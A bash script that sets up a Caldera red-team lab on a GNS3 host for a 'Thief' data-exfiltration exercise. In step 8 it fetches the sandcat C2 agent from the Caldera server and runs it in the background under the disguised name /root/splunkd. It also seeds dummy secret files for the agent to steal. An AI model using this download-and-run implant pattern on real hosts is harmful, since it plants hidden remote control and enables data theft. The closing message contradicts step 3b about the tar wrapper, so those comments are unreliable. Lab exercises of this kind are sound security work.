#!/usr/bin/env bash
#
# Caldera lab setup — run on the GNS3 host (azureuser@slough)
# --------------------------------------------------------------
# Re-establishes the red-team side of the exercise on a duplicated project:
# NAT for the inner bridge, sandcat agent deployment on ADMIN, and the three
# dummy sensitive files. Mirrors exactly what was done by hand on the
# original project — this just makes it repeatable across duplicates.
#
# Discovers the project by name pattern (or accepts an explicit override) and
# resolves ADMIN's container ID from it, so container IDs don't need updating
# by hand every time you duplicate.
#
# Caldera itself (172.18.0.6:8888) is NOT a GNS3 node — it's a sibling
# container on the outer acs-ai-security-network, confirmed real per your own
# endpoint table. No discovery needed for it, it's a fixed address.
 
set -uo pipefail
 
# ---- Configuration ----
PROJECT_ID="${PROJECT_ID:-}"                                          # set explicitly to skip discovery
PROJECT_NAME_PATTERN="${PROJECT_NAME_PATTERN:-Full-UK-Intergalactic-2-Copy-20260602-1-Thief-1-Mitigated}"
CALDERA_SERVER="http://172.18.0.6:8888"                               # confirmed real Caldera address
 
# ---- 1. Resolve project ID ----
if [ -z "$PROJECT_ID" ]; then
  echo "== No PROJECT_ID set — searching projects matching '$PROJECT_NAME_PATTERN' =="
  MATCHES=$(curl -s http://localhost:3080/v2/projects | python3 -c "
import json, sys
pat = '''$PROJECT_NAME_PATTERN'''
for p in json.load(sys.stdin):
    if pat in p.get('name',''):
        print(p.get('project_id'), '|', p.get('status'), '|', p.get('name'))
")
  MATCH_COUNT=$(echo "$MATCHES" | grep -c . || true)
 
  if [ "$MATCH_COUNT" -eq 0 ]; then
    echo "!! No project matched '$PROJECT_NAME_PATTERN'. Set PROJECT_ID explicitly and re-run:" >&2
    echo "   PROJECT_ID=<id> $0" >&2
    exit 1
  elif [ "$MATCH_COUNT" -eq 1 ]; then
    PROJECT_ID=$(echo "$MATCHES" | cut -d'|' -f1 | tr -d ' ')
    echo "   found: $MATCHES"
  else
    OPENED=$(echo "$MATCHES" | grep '| opened |' || true)
    OPENED_COUNT=$(echo "$OPENED" | grep -c . || true)
    if [ "$OPENED_COUNT" -eq 1 ]; then
      PROJECT_ID=$(echo "$OPENED" | cut -d'|' -f1 | tr -d ' ')
      echo "   multiple name matches, exactly one is 'opened' — using it:"
      echo "   $OPENED"
    else
      echo "!! Multiple candidate projects, can't pick automatically:" >&2
      echo "$MATCHES" >&2
      echo "   Set PROJECT_ID explicitly and re-run:" >&2
      echo "   PROJECT_ID=<id> $0" >&2
      exit 1
    fi
  fi
fi
echo "== Using project: $PROJECT_ID =="
 
# ---- 2. Resolve ADMIN's container ID and status ----
ADMIN_INFO=$(curl -s "http://localhost:3080/v2/projects/${PROJECT_ID}/nodes" | python3 -c "
import json, sys
for n in json.load(sys.stdin):
    if n.get('name') == 'ADMIN':
        print(n.get('node_id',''), '|', n.get('status',''), '|', n.get('properties', {}).get('container_id',''))
")
if [ -z "$ADMIN_INFO" ]; then
  echo "!! No node named 'ADMIN' found in project $PROJECT_ID" >&2
  exit 1
fi
ADMIN_NODE_ID=$(echo "$ADMIN_INFO" | cut -d'|' -f1 | tr -d ' ')
ADMIN_STATUS=$(echo "$ADMIN_INFO" | cut -d'|' -f2 | tr -d ' ')
ADMIN_ID=$(echo "$ADMIN_INFO" | cut -d'|' -f3 | tr -d ' ')
echo "== ADMIN: node_id=$ADMIN_NODE_ID status=$ADMIN_STATUS container_id=$ADMIN_ID =="
 
if [ "$ADMIN_STATUS" != "started" ]; then
  echo "== ADMIN not started — starting it =="
  curl -s -X POST "http://localhost:3080/v2/projects/${PROJECT_ID}/nodes/${ADMIN_NODE_ID}/start" > /dev/null
  sleep 5
fi
 
# ---- 3. Inner Docker daemon (DinD) is up — check, and start it if not ----
echo "== Checking inner dockerd inside gns3-server =="
if docker exec gns3-server sh -c 'docker version' >/dev/null 2>&1; then
  echo "   ok — dockerd is running and responsive"
else
  echo "   not responsive — attempting to start it"
 
  # a stale PID file from a previous crash/restart makes dockerd refuse to start;
  # clear it before trying, same fix as the manual troubleshooting steps
  docker exec gns3-server sh -c 'rm -f /var/run/docker.pid'
 
  docker exec gns3-server sh -c 'nohup dockerd --host=tcp://0.0.0.0:2375 --host=unix:///var/run/docker.sock > /var/log/dockerd.log 2>&1 &'
 
  # poll for actual readiness rather than assuming a fixed delay is enough —
  # 'docker version' succeeding is the real signal, not just a process existing
  READY=0
  for i in 1 2 3 4 5 6 7 8 9 10; do
    sleep 2
    if docker exec gns3-server sh -c 'docker version' >/dev/null 2>&1; then
      READY=1
      break
    fi
  done
 
  if [ "$READY" -eq 1 ]; then
    echo "   started successfully after ~$((i * 2))s"
  else
    echo "!! could not get dockerd responsive after 20s. Diagnostics:" >&2
    docker exec gns3-server ps aux | grep dockerd >&2 || true
    echo "-- /var/log/dockerd.log (last 30 lines) --" >&2
    docker exec gns3-server sh -c 'tail -30 /var/log/dockerd.log' >&2 2>/dev/null || true
    echo "Deliberately NOT attempting 'docker restart gns3-server' here — that would" >&2
    echo "tear down every nested GNS3 node's running state, not just fix this. Resolve" >&2
    echo "manually before re-running." >&2
    exit 1
  fi
fi
 
# ---- 3b. Environment fitness check: does tar on ADMIN actually support -P? ----
# The 'Compress staged directory' ability hardcodes `tar -P -zcf ...`. GNU tar
# accepts -P (don't strip leading '/'); BusyBox tar has no -P option at all and
# fails immediately with "unrecognized option: P" — which is exactly what broke
# a prior run on this topology. Nothing before this point in the script checks
# for that, so a leaner base image (Alpine/BusyBox-based) silently produces a
# non-comparable test run instead of a real failure signal. Catch it here instead.
#
# NOTE: this used to attempt `apk add --no-cache tar` to pull in real GNU tar.
# That path is a confirmed dead end on this topology — ADMIN sits behind
# MainRouter (192.168.1.0/24) for DNS, and MainRouter (a GNS3 router node, not
# a real resolver) actively REFUSES DNS queries. Separately, the MASQUERADE
# rule added in step 4 below only covers 172.100.1.0/24, which isn't ADMIN's
# subnet anyway — so even fixing DNS wouldn't make apk's fetch succeed. Fixed
# below instead by writing a small wrapper at /usr/local/sbin/tar that strips
# -P before delegating to BusyBox tar — needs no internet access at all, and
# has been empirically verified against this exact container (2026-07-26).
echo "== Verifying tar on ADMIN supports -P (required by 'Compress staged directory') =="
TAR_CHECK=$(docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'tar -P -cf /tmp/tar-fitness-check.tar /etc/hostname 2>&1'")
if echo "$TAR_CHECK" | grep -qi "unrecognized option"; then
  echo "   !! BusyBox tar detected (no -P support) — installing -P-stripping wrapper (no internet required)"

  # Base64-encoded wrapper script, sidesteps nested-shell quoting issues
  # (host -> gns3-server -> ADMIN container). Decoded, it reads:
  #   #!/bin/sh
  #   args=""
  #   for a in "$@"; do
  #     case "$a" in
  #       -P) ;;
  #       *) args="$args $a" ;;
  #     esac
  #   done
  #   exec /bin/busybox tar $args
  TAR_WRAPPER_B64="IyEvYmluL3NoCmFyZ3M9IiIKZm9yIGEgaW4gIiRAIjsgZG8KICBjYXNlICIkYSIgaW4KICAgIC1QKSA7OwogICAgKikgYXJncz0iJGFyZ3MgJGEiIDs7CiAgZXNhYwpkb25lCmV4ZWMgL2Jpbi9idXN5Ym94IHRhciAkYXJncwo="

  docker exec gns3-server sh -c "docker exec $ADMIN_ID mkdir -p /usr/local/sbin"
  docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'echo $TAR_WRAPPER_B64 | base64 -d > /usr/local/sbin/tar && chmod +x /usr/local/sbin/tar'"

  RECHECK=$(docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'tar -P -cf /tmp/tar-fitness-check.tar /etc/hostname 2>&1'")
  if echo "$RECHECK" | grep -qi "unrecognized option"; then
    echo "   !! Fix failed — wrapper installed but not being picked up." >&2
    echo "   Check that /usr/local/sbin precedes /bin in PATH inside ADMIN:" >&2
    echo "     docker exec gns3-server sh -c \"docker exec $ADMIN_ID sh -c 'echo \\\$PATH; which tar'\"" >&2
    echo "   Fix manually before proceeding, or treat this as a known environmental gap" >&2
    echo "   when interpreting results." >&2
  else
    echo "   fixed — /usr/local/sbin/tar wrapper installed and confirmed working"
  fi
else
  echo "   ok — tar already supports -P"
fi
docker exec gns3-server sh -c "docker exec $ADMIN_ID rm -f /tmp/tar-fitness-check.tar" >/dev/null 2>&1
 
# ---- 4. NAT for the inner bridge (idempotent) ----
echo "== Checking MASQUERADE rule for 172.100.1.0/24 =="
if docker exec gns3-server sh -c "iptables -t nat -L -n -v" | grep -q "172.100.1.0"; then
  echo "   already present, skipping"
else
  docker exec gns3-server sh -c "iptables -t nat -A POSTROUTING -s 172.100.1.0/24 -o eth0 -j MASQUERADE"
  echo "   added"
fi
 
# ---- 5. Confirm ADMIN has an IPv4 address, DHCP if needed ----
echo "== Checking ADMIN's IPv4 address =="
ADMIN_IP=$(docker exec gns3-server sh -c "docker exec $ADMIN_ID ip -4 addr show eth0" | grep -oP 'inet \K[0-9.]+')
if [ -z "$ADMIN_IP" ]; then
  echo "   no IPv4 yet — requesting DHCP lease"
  docker exec gns3-server sh -c "docker exec $ADMIN_ID udhcpc -i eth0"
  ADMIN_IP=$(docker exec gns3-server sh -c "docker exec $ADMIN_ID ip -4 addr show eth0" | grep -oP 'inet \K[0-9.]+')
fi
echo "   ADMIN IP: $ADMIN_IP"
 
# ---- 6. Confirm reachability to Caldera ----
echo "== Checking reachability to Caldera ($CALDERA_SERVER) from ADMIN =="
HTTP_CODE=$(docker exec gns3-server sh -c "docker exec $ADMIN_ID curl -s -o /dev/null -w '%{http_code}' --max-time 5 $CALDERA_SERVER")
if [ "$HTTP_CODE" != "200" ]; then
  echo "!! Caldera not reachable from ADMIN (got HTTP $HTTP_CODE). Check NAT/routing before continuing." >&2
  exit 1
fi
echo "   reachable (HTTP 200)"
 
# ---- 7. Clean any stale attack artifacts from a previous run (reset, not the sensitive files) ----
echo "== Clearing any stale staged/archive artifacts =="
docker exec gns3-server sh -c "docker exec $ADMIN_ID rm -rf /staged /staged.tar.gz"
 
# ---- 8. Deploy the sandcat agent (skip if already running) ----
echo "== Checking for an existing agent process =="
EXISTING_PID=$(docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'pgrep -f /root/splunkd'" 2>/dev/null || true)
if [ -n "$EXISTING_PID" ]; then
  echo "   agent already running (pid $EXISTING_PID) — skipping deploy. Kill it first if you want a fresh install."
else
  echo "== Deploying sandcat agent =="
  docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c '
server=$CALDERA_SERVER
curl -s -X POST -H file:sandcat.go -H platform:linux \$server/file/download > /root/splunkd
chmod +x /root/splunkd
nohup /root/splunkd -server \$server -group red -v > /root/splunkd.log 2>&1 &
'"
  sleep 3
  echo "== Verifying beaconing =="
  docker exec gns3-server sh -c "docker exec $ADMIN_ID tail -20 /root/splunkd.log"
fi
 
# ---- 9. Seed the sensitive dummy files ----
# !! WARNING !! This unconditionally (re)creates the three files fresh, small,
# and at their ORIGINAL /root/ paths. If the Thief mitigation (relocate to
# /root/.config/secure/ + pad past 500KB) has already been applied, running
# this script again SILENTLY REVERTS IT — no error, no warning at runtime.
# Correct order: run this setup script FIRST for a clean baseline, THEN apply
# the mitigation, THEN start the Caldera operation. If you must re-run this
# script after the mitigation is applied, reapply the mitigation afterward.
echo "== Seeding sensitive dummy files =="
docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'echo dummy-secret > /root/secrets.yml'"
docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'echo dummy-audio > /root/recording.wav'"
docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'echo dummy-image > /root/photo.png'"
 
echo ""
echo "== Verification =="
docker exec gns3-server sh -c "docker exec $ADMIN_ID sh -c 'find / -name \"*.yml\" -o -name \"*.wav\" -o -name \"*.png\" 2>/dev/null'"
docker exec gns3-server sh -c "docker exec $ADMIN_ID ps aux | grep '[s]plunkd'"
 
echo ""
echo "== Done. Project $PROJECT_ID / ADMIN ($ADMIN_ID, $ADMIN_IP) is ready to run Thief against. =="
echo "   Tar fitness was checked and fixed above if needed — Compress and Exfil should now"
echo "   actually be reachable, unlike the run where BusyBox tar broke Compress silently."
echo "   (Separately, and not included here: the /usr/local/sbin/tar wrapper from the"
echo "    original session — its effect on tar's -P handling was never confirmed. That's"
echo "    a different thing from the fitness check above; add it back manually only if"
echo "    you specifically want to retest that unrelated experiment.)"